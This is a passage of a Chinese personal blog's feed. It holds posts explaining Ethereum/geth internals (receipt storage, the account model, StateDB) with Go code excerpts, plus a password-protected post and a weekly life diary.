class="hljs-string">&quot;Failed to store block receipts&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>所以看存储了哪些内容，只需要看 ReceiptForStorage 的 EncodeRLP 方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/types/receipt.go:179</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *ReceiptForStorage)</span> <span class="hljs-title">EncodeRLP</span><span class="hljs-params">(w io.Writer)</span> <span class="hljs-title">error</span></span> &#123;<br>   enc := &amp;receiptStorageRLP&#123;<br>      PostStateOrStatus: (*Receipt)(r).statusEncoding(),<br>      CumulativeGasUsed: r.CumulativeGasUsed,<br>      TxHash:            r.TxHash,<br>      ContractAddress:   r.ContractAddress,<br>      Logs:              <span class="hljs-built_in">make</span>([]*LogForStorage, <span class="hljs-built_in">len</span>(r.Logs)),<br>      GasUsed:           r.GasUsed,<br>   &#125;<br>   <span class="hljs-keyword">for</span> i, log := <span class="hljs-keyword">range</span> r.Logs &#123;<br>      enc.Logs[i] = (*LogForStorage)(log)<br>   &#125;<br>   <span class="hljs-keyword">return</span> rlp.Encode(w, enc)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-5.png#clientId=u9ae9216b-af72-4&from=paste&height=482&id=u14eddb16&margin=%5Bobject%20Object%5D&originHeight=746&originWidth=854&originalType=url&status=done&style=none&taskId=ubb7522ff-0229-47a2-8673-79e407e628c&width=552"></p><h1 id="交易回执示例–文档参考"><a href="#交易回执示例–文档参考" class="headerlink" title="交易回执示例–文档参考"></a>交易回执示例–文档参考</h1><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%8C%BA%E5%9D%97%E4%B8%8E%E4%BA%A4%E6%98%93-6.png#clientId=u9ae9216b-af72-4&from=paste&height=737&id=u301c1b6f&margin=%5Bobject%20Object%5D&originHeight=1474&originWidth=1664&originalType=url&status=done&style=none&taskId=u1730403f-a93e-4126-920d-39990df7fdc&width=832"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>流量在线识别系统demo</title>
    <link href="/2021/04/20/%E6%B5%81%E9%87%8F%E5%9C%A8%E7%BA%BF%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9Fdemo_new/"/>
    <url>/2021/04/20/%E6%B5%81%E9%87%8F%E5%9C%A8%E7%BA%BF%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9Fdemo_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9f8657519d74e1b886ad6e06860750a6ef7b16364a43fc09946108b28949d471"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Life-Weekly-April-19-to-25</title>
    <link href="/2021/04/20/Life-Weekly-April-19-to-25_new/"/>
    <url>/2021/04/20/Life-Weekly-April-19-to-25_new/</url>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>特斯拉最近一直出事故，脚刹系统很有问题，怀疑是软件 bug，官方售后居然在发生事故后会清除事故数据和行车记录视频，这是一个负责任的大公司能干出的事吗？</li><li>特斯拉疑似提供事故数据，数据不规范，传感器数量明显不对，搁这儿欺骗消费者呢？</li><li>中国派巴基斯坦大使下榻酒店遭恐怖袭击，中方人员外出会谈，无人员受伤。</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>周一：下雨，被学长鸽了，让我自己写在线系统，麻了。拖了一个月到比赛截至的时候说自己没写。行吧，我自己写。</li><li>周二：下雨，加油！</li><li>周三：校运会==放假，写完了！</li><li>周四：买了一把胜利 CHA-9500 球拍和尤尼克斯的手胶，开始准备认真打羽毛球了！</li><li>周五：通过考核，成为预备党员！美赛又是 M 奖，淦，再也不玩了！学校咋都 2O 19F，卷疯了。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><ol><li>算法好文</li><li>羽毛球训练好文</li></ol><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>伍六七终于到主线了！！！！何导啊何导，有青山老贼那味了，希望别一部国漫画 10 年就行，追起来太费劲了。</li></ol><p><img src="https://image.hackerjerry.top/Life-Weekly-April-19-to-25-1.jpeg#clientId=u67cebdca-6850-4&from=drop&id=ufaa1c361&margin=%5Bobject%20Object%5D&name=IMG_20210421_225640.jpg&originHeight=1067&originWidth=1940&originalType=binary&size=344924&status=done&style=none&taskId=u7e240ddf-325a-4031-8b88-95b8b3a8a4f" alt="IMG_20210421_225640.jpg"><br><strong>只攻不守的剑，也能用来保护人</strong>。</p><h2 id="摘录"><a href="#摘录" class="headerlink" title="摘录"></a>摘录</h2><ol><li>关于恋爱观。</li></ol><p>「<strong>交往</strong>」这件事，不只是为了休息日能一起去哪玩，那只是附带的东西罢了。[<strong>互相支撑着对方的生活</strong>」才是交往的本质。<br>能互相给予对方“<strong>在看不见的地方让自己的生活变得丰富</strong>”这样的力量，这才是“交往”。就算不能时时刻刻在一起，但却能带给自己仿佛在一起时一般的存在感的人，这才是“恋人”。<br>真正的谈恋爱是两个人相处比我独处更有趣、更有意义，真正的谈恋爱是两个人为了未来而考虑、努力，真正的恋爱是我愿意支持你的想法，你愿意鼓励我主动追梦，真正的恋爱是时间沉淀感情后、冷静思考后的坚定选择。无关激素，无关冲动，不是想谈恋爱而找个人谈恋爱，而是我们经历了很多事情后，我们了解彼此后，选择了彼此。</p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ol><li>软件安全的 ret2libc 要自学一下了！</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>做人做事</li></ol><p><img src="https://image.hackerjerry.top/Life-Weekly-April-19-to-25-2.png#clientId=u67cebdca-6850-4&from=paste&height=1443&id=u062f504b&margin=%5Bobject%20Object%5D&originHeight=2885&originWidth=720&originalType=url&status=done&style=none&taskId=uc553a112-4017-49b5-b30d-b410852a388&width=360"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>区块链底层-账户模型</title>
    <link href="/2021/04/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E8%B4%A6%E6%88%B7%E6%A8%A1%E5%9E%8B_new/"/>
    <url>/2021/04/17/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E8%B4%A6%E6%88%B7%E6%A8%A1%E5%9E%8B_new/</url>
    
    <content type="html"><![CDATA[<p>我们采用和以太坊相似的账户模型。</p><a id="more"></a><h1 id="账户数据结构"><a href="#账户数据结构" class="headerlink" title="账户数据结构"></a>账户数据结构</h1><p>以太坊数据以账户为单位组织，账户数据的变更引起账户状态变化, 从而引起以太坊状态变化。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/state/state_object.go:100</span><br><span class="hljs-keyword">type</span> Account <span class="hljs-keyword">struct</span> &#123;<br>    Nonce    <span class="hljs-keyword">uint64</span><br>    Balance  *big.Int<br>    Root     common.Hash<br>    CodeHash []<span class="hljs-keyword">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>在密码学领域，Nonce 代表一个只使用一次的数字。它往往是一个随机或伪随机数，以避免重复。 以太坊账户中加入 Nonce，可避免重放攻击（不过不是随机产生）。账户 Nonce 起始值是 0，后续每触发一次账户执行则 Nonce 值计加一次。 其中一处的计数逻辑如下：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/state_transition.go:212</span><br>st.state.SetNonce(msg.From(), st.state.GetNonce(sender.Address())+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><ul><li>Balance 则记录该账户所拥有的以太（ETH）数量，称为账户余额.</li></ul><p>当然必须保证转账方余额充足，在转移前需要 CanTransfer 检查， 如果余额充足，则执行 Transfer 转移 Value 数量的以太。</p><ul><li>账户状态哈希值 StateRoot，是一颗默克尔压缩前缀树（Merkle Patricia Tree）的根值。可以直接利用 StateRoot 从 Leveldb 中快速读取具体的某个状态数据</li></ul><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E8%B4%A6%E6%88%B7%E6%A8%A1%E5%9E%8B-1.png#clientId=u7a530312-f976-4&from=paste&height=318&id=uadb7d967&margin=%5Bobject%20Object%5D&originHeight=1006&originWidth=1062&originalType=url&status=done&style=none&taskId=u8125fdd8-2c02-4142-8ff6-2a5b708f249&width=336"><br>上图是以太坊账户数据存储结构，账户内部实际只存储关键数据，而合约代码以及合约自身数据则通过对应的哈希值关联。 因为每个账户对象，将作为一个以太坊账户树的一个叶子数据存储， 不能太大。<br>从以太坊作为一个世界态(World State)状态机视角看数据关系如下：<br><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E8%B4%A6%E6%88%B7%E6%A8%A1%E5%9E%8B-2.png#clientId=u7a530312-f976-4&from=paste&height=125&id=ud8337454&margin=%5Bobject%20Object%5D&originHeight=174&originWidth=955&originalType=url&status=done&style=none&taskId=u96e7177e-6233-4ade-8cc1-94578d56711&width=686.5"><br>我们通过一段示例代码，感受下以太坊账户数据存储。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span>(...)<br><span class="hljs-keyword">var</span> toAddr =common.HexToAddress<br><span class="hljs-keyword">var</span> toHash =common.BytesToHash<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>  &#123;<br>    statadb, _ := state.New(common.Hash&#123;&#125;,<br>        state.NewDatabase(rawdb.NewMemoryDatabase()))<span class="hljs-comment">// ❶</span><br><br>    acct1:=toAddr(<span class="hljs-string">&quot;0x0bB141C2F7d4d12B1D27E62F86254e6ccEd5FF9a&quot;</span>)<span class="hljs-comment">// ❷</span><br>    acct2:=toAddr(<span class="hljs-string">&quot;0x77de172A492C40217e48Ebb7EEFf9b2d7dF8151B&quot;</span>)<br><br>    statadb.AddBalance(acct1,big.NewInt(<span class="hljs-number">100</span>))<br>    statadb.AddBalance(acct2,big.NewInt(<span class="hljs-number">888</span>))<br><br>    contract:=crypto.CreateAddress(acct1,statadb.GetNonce(acct1))<span class="hljs-comment">// ❸</span><br>    statadb.CreateAccount(contract)<br>    statadb.SetCode(contract,[]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;contract code bytes&quot;</span>))<span class="hljs-comment">// ❹</span><br><br>    statadb.SetNonce(contract,<span class="hljs-number">1</span>)<br>    statadb.SetState(contract,toHash([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;owner&quot;</span>)),toHash(acct1.Bytes()))<span class="hljs-comment">//❺</span><br>    statadb.SetState(contract,toHash([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;name&quot;</span>)),toHash([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;ysqi&quot;</span>)))<br><br>    statadb.SetState(contract,toHash([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;online&quot;</span>)),toHash([]<span class="hljs-keyword">byte</span>&#123;<span class="hljs-number">1</span>&#125;)<br>    statadb.SetState(contract,toHash([]<span class="hljs-keyword">byte</span>(<span class="hljs-string">&quot;online&quot;</span>)),toHash([]<span class="hljs-keyword">byte</span>&#123;&#125;))<span class="hljs-comment">//❻</span><br><br>    statadb.Commit(<span class="hljs-literal">true</span>)<span class="hljs-comment">// ❼</span><br>    fmt.Println(<span class="hljs-keyword">string</span>(statadb.Dump()))<span class="hljs-comment">// ❽</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码中，我们创建了三个账户，并且提交到数据库中。最终打印出当前数据中所有账户的数据信息：</p><ul><li>❶ 一行代码涉及多个操作。首先是<strong>创建一个内存 KV 数据库</strong>，再<strong>包装为 stata 数据库实例</strong>， 最后<strong>利用一个空的 DB 级的 StateRoot，初始化一个以太坊 statadb</strong>。</li><li>❷ 定义两个账户 acct1 和 acct2，并分别添加 100 和 888 到账户余额。</li><li>❸ 模拟合约账户的创建过程，由外部账户 acct1 创建合约账户地址，并将此地址载入 statadb。</li><li>❹ 在将合约代码加入刚刚创建的合约账户中，在写入合约代码的同时， 会利用 crypto.Keccak256Hash(code)计算合约代码哈希，保留在账户数据中。</li><li>❺ 模拟合约执行过程，涉及修改合约状态，新增三项状态数据 owner,name 和 online，分别对应不同值。</li><li>❻ 这里和前面不同的是，是给状态 online 赋值为空[]byte{}，因为所有状态的默认值均是[]byte{}， 在提交到数据库时，如 Leveldb 认为这些状态无有效值，会从数据库文件中删除此记录。 因此，此操作实际是一个删除状态 online 操作。</li><li>❼ 上面所有操作，还都<strong>只是发生在 statdb 内存</strong>中，并未真正的写入数据库文件。 <strong>执行 Commit</strong>，才会<strong>将关于 statadb 的所有变更更新到数据库文件</strong>中。</li><li>❽ 一旦提交数据，则可以使用 Dump 命令从数据库中查找此 stata 相关的所有数据，包括所有账户。 并<strong>以 JSON 格式返还</strong>。这里，我们将返还结果直接打印输出。</li></ul><p>代码执行输出结果如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;root&quot;</span>: <span class="hljs-string">&quot;3a25b0816cf007c0b878ca7a62ba35ee0337fa53703f281c41a791a137519f00&quot;</span>,<br>  <span class="hljs-attr">&quot;accounts&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;0bb141c2f7d4d12b1d27e62f86254e6cced5ff9a&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;balance&quot;</span>: <span class="hljs-string">&quot;100&quot;</span>,<br>      <span class="hljs-attr">&quot;nonce&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;root&quot;</span>: <span class="hljs-string">&quot;56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;</span>,<br>      <span class="hljs-attr">&quot;codeHash&quot;</span>: <span class="hljs-string">&quot;c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470&quot;</span>,<br>      <span class="hljs-attr">&quot;code&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;storage&quot;</span>: &#123;&#125;<br>    &#125;,<br>    <span class="hljs-attr">&quot;77de172a492c40217e48ebb7eeff9b2d7df8151b&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;balance&quot;</span>: <span class="hljs-string">&quot;888&quot;</span>,<br>      <span class="hljs-attr">&quot;nonce&quot;</span>: <span class="hljs-number">0</span>,<br>      <span class="hljs-attr">&quot;root&quot;</span>: <span class="hljs-string">&quot;56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421&quot;</span>,<br>      <span class="hljs-attr">&quot;codeHash&quot;</span>: <span class="hljs-string">&quot;c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470&quot;</span>,<br>      <span class="hljs-attr">&quot;code&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>      <span class="hljs-attr">&quot;storage&quot;</span>: &#123;&#125;<br>    &#125;,<br>    <span class="hljs-attr">&quot;80580f576731dc1e1dcc53d80b261e228c447cdd&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;balance&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>      <span class="hljs-attr">&quot;nonce&quot;</span>: <span class="hljs-number">1</span>,<br>      <span class="hljs-attr">&quot;root&quot;</span>: <span class="hljs-string">&quot;1f6d937817f2ac217d8b123c4983c45141e50bd0c358c07f3c19c7b526dd4267&quot;</span>,<br>      <span class="hljs-attr">&quot;codeHash&quot;</span>: <span class="hljs-string">&quot;c668dac8131a99c411450ba912234439ace20d1cc1084f8e198fee0a334bc592&quot;</span>,<br>      <span class="hljs-attr">&quot;code&quot;</span>: <span class="hljs-string">&quot;636f6e747261637420636f6465206279746573&quot;</span>,<br>      <span class="hljs-attr">&quot;storage&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;000000000000000000000000000000000000000000000000000000006e616d65&quot;</span>: <span class="hljs-string">&quot;8479737169&quot;</span>,<br>        <span class="hljs-attr">&quot;0000000000000000000000000000000000000000000000000000006f776e6572&quot;</span>: <span class="hljs-string">&quot;940bb141c2f7d4d12b1d27e62f86254e6cced5ff9a&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>区块链底层-存储</title>
    <link href="/2021/04/16/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%AD%98%E5%82%A8_new/"/>
    <url>/2021/04/16/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%AD%98%E5%82%A8_new/</url>
    
    <content type="html"><![CDATA[<p>本文聚焦区块链底层技术–存储技术。主要包含世界状态、账户状态和 MPT 树。<br>参考：<a href="https://learnblockchain.cn/books/geth/part3/statedb.html">https://learnblockchain.cn/books/geth/part3/statedb.html</a></p><a id="more"></a><h1 id="StateDB-世界状态"><a href="#StateDB-世界状态" class="headerlink" title="StateDB-世界状态"></a>StateDB-世界状态</h1><p><img src="https://image.hackerjerry.top/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%95%E5%B1%82-%E5%AD%98%E5%82%A8-1.png#clientId=u34e3a6f1-8d42-4&from=paste&height=136&id=u29593524&margin=%5Bobject%20Object%5D&originHeight=174&originWidth=955&originalType=url&status=done&style=none&taskId=ud67f5524-9e0a-474e-8ebf-a18abeb618d&width=747.5"><br>从程序设计角度，StateDB 有多种用途：</p><ol><li>维护账户状态到世界状态的映射。</li><li>支持修改、回滚、提交状态。</li><li>支持持久化状态到数据库中。</li><li>是状态进出默克尔树的媒介。</li></ol><p>实际上** StateDB <strong>充当</strong>状态（数据）<strong>、</strong>Trie(树)<strong>、</strong>LevelDB（存储）**的协调者。</p><h2 id="实例化-StateDB"><a href="#实例化-StateDB" class="headerlink" title="实例化 StateDB"></a>实例化 StateDB</h2><p>在对状态的任何操作前，我们要先构建一个 StateDB 来操作状态。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">db: = state.NewDatabase(levelDB)<br>statedb, err := state.New(block.Root(), db)<br></code></pre></td></tr></table></figure><p>首先，我们要告诉 StateDB ，我们要使用哪个状态。因此<strong>需要提供 StateRoot 作为默克尔树根去构建树</strong>。StateRoot 值相当于数据版本号，根据版本号可以明确的知道要使用使用哪个版本的状态。当然，数据内容并没在树中，<strong>需要到一个数据库中读取</strong>。因此在构建 State DB 时需要提供 stateRoot 和 db 才能完成构建。<br>任何实现 state.Database 接口的 db 都可以使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/state/database.go:42</span><br><span class="hljs-keyword">type</span> Database <span class="hljs-keyword">interface</span> &#123;<br>OpenTrie(root common.Hash) (Trie, error)<br>OpenStorageTrie(addrHash, root common.Hash) (Trie, error)<br>CopyTrie(Trie) Trie<br>ContractCode(addrHash, codeHash common.Hash) ([]<span class="hljs-keyword">byte</span>, error)<br>ContractCodeSize(addrHash, codeHash common.Hash) (<span class="hljs-keyword">int</span>, error)<br><br><span class="hljs-comment">// TrieDB retrieves the low level trie database used for data storage.</span><br>TrieDB() *trie.Database<br>&#125;<br></code></pre></td></tr></table></figure><p>通过 db 可以访问：</p><ol><li>OpenTrie: 打开指定状态版本(root)的含世界状态的顶层树。</li><li>OpenStorageTrie: <strong>打开账户(addrHash)下</strong>指定状态版本(root)的<strong>账户数据存储树</strong>。</li><li>CopyTrie: 深度拷贝树。</li><li>ContractCode：获取账户（addrHash）的合约，必须和合约哈希(codeHash)匹配。</li><li>ContractCodeSize 获取指定合约大小</li><li>TrieDB：<strong>获得 Trie 底层的数据驱动 DB</strong>，如:** levedDB** 、<strong>内存数据库</strong>、远程数据库</li></ol><p>当前有两种类型的 DB 实现了 Database 接口，轻节点使用的 odrDatabase ，和正常节点端使用的带有缓存的 cachingDB 。 因为轻节点并不存储数据，需要通过向其他节点查询来获得数据，而 odrDatabase 就是这种数据读取方式的封装。一个普通节点已内置 levelDB，为了提高读写性能，使用 cachingDB 对其进行一次封装。<br>在实例化 StateDB 时，需要立即打开含有世界状态的 Trie 树。如果 root 对应的树不存在，则会实例化失败 ①。实例化的 StateDB 中将记录多种信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/state/statedb.go:59</span><br><span class="hljs-keyword">type</span> StateDB <span class="hljs-keyword">struct</span> &#123;<br>db   Database<br>trie Trie<br>stateObjects      <span class="hljs-keyword">map</span>[common.Address]*stateObject<br>stateObjectsDirty <span class="hljs-keyword">map</span>[common.Address]<span class="hljs-keyword">struct</span>&#123;&#125;<br>dbErr error<br>refund <span class="hljs-keyword">uint64</span><br><br>thash, bhash common.Hash<br>txIndex      <span class="hljs-keyword">int</span><br>logs         <span class="hljs-keyword">map</span>[common.Hash][]*types.Log<br>logSize      <span class="hljs-keyword">uint</span><br><br>preimages <span class="hljs-keyword">map</span>[common.Hash][]<span class="hljs-keyword">byte</span><br>journal        *journal<br>validRevisions []revision<br>nextRevisionId <span class="hljs-keyword">int</span><br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>db: 操作状态的<strong>底层数据库</strong>，在实例化 StateDB 时指定 ②。</li><li>trie: 世界状态所在的树实例对象，现在只有以太坊改进的默克尔前缀压缩树。</li><li>stateObjects: <strong>已账户地址为键的账户状态对象，能够在内存中维护使用过的账户</strong>。</li><li>stateObjectsDirty： 标记被修改过的账户。</li><li>journal： 是修改状态的日志流水，使用此日志流水可回滚状态。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/state/statedb.go:92</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">New</span><span class="hljs-params">(root common.Hash, db Database)</span> <span class="hljs-params">(*StateDB, error)</span></span> &#123;<br>tr, err := db.OpenTrie(root)<span class="hljs-comment">//①</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;StateDB&#123;<br>db:                db,<span class="hljs-comment">//②</span><br>trie:              tr,<br>stateObjects:      <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[common.Address]*stateObject),<br>stateObjectsDirty: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[common.Address]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>logs:              <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[common.Hash][]*types.Log),<br>preimages:         <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[common.Hash][]<span class="hljs-keyword">byte</span>),<br>journal:           newJournal(),<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面对的代码实例化了一个 statedb。</p><h2 id="读写-StateDB-状态"><a href="#读写-StateDB-状态" class="headerlink" title="读写 StateDB 状态"></a>读写 StateDB 状态</h2><p>你所访问的任何数据必然属于某个账户下的状态，世界状态态仅仅是通过一颗树来建立安全的映射。因此你所访问的数据可以分为如下几种类型：</p><ol><li>访问账户基础属性：Balance、Nonce、Root、CodeHash</li><li>读取合约账户代码</li><li>读取合约账户中存储内容</li></ol><p>在代码实现中，为了便于账户隔离管理，使用不开放的 stateObject 来维护。 stateObject 注意代码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> stateObject <span class="hljs-keyword">struct</span> &#123;<br>address  common.Address<span class="hljs-comment">//对应的账户地址</span><br>addrHash common.Hash <span class="hljs-comment">// 账户地址的哈希值</span><br>data     Account <span class="hljs-comment">//账户属性</span><br>db       *StateDB <span class="hljs-comment">//底层数据库</span><br><br>    <span class="hljs-comment">//...</span><br><span class="hljs-comment">// 写缓存</span><br>trie Trie <span class="hljs-comment">// 存储树，第一次访问时初始化</span><br>code Code <span class="hljs-comment">// contract bytecode, which gets set when code is loaded</span><br>    <span class="hljs-comment">//...</span><br>&#125;<br><span class="hljs-keyword">type</span> Account <span class="hljs-keyword">struct</span> &#123;<br>Nonce    <span class="hljs-keyword">uint64</span><br>Balance  *big.Int<br>Root     common.Hash <span class="hljs-comment">// merkle root of the storage trie</span><br>CodeHash []<span class="hljs-keyword">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到 stateObject 中维护关于某个账户的所有信息，涉及账户地址、账户地址哈希、账户属性、底层数据库、存储树等内容。<br>当你访问状态时，需要指定账户地址。比如获取账户合约，合约账户代码，均是通过账户地址，获得获得对应的账户的 stateObject。因此，当你访问某账户余额时，需要从世界状态树 Trie 中读取账户状态。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 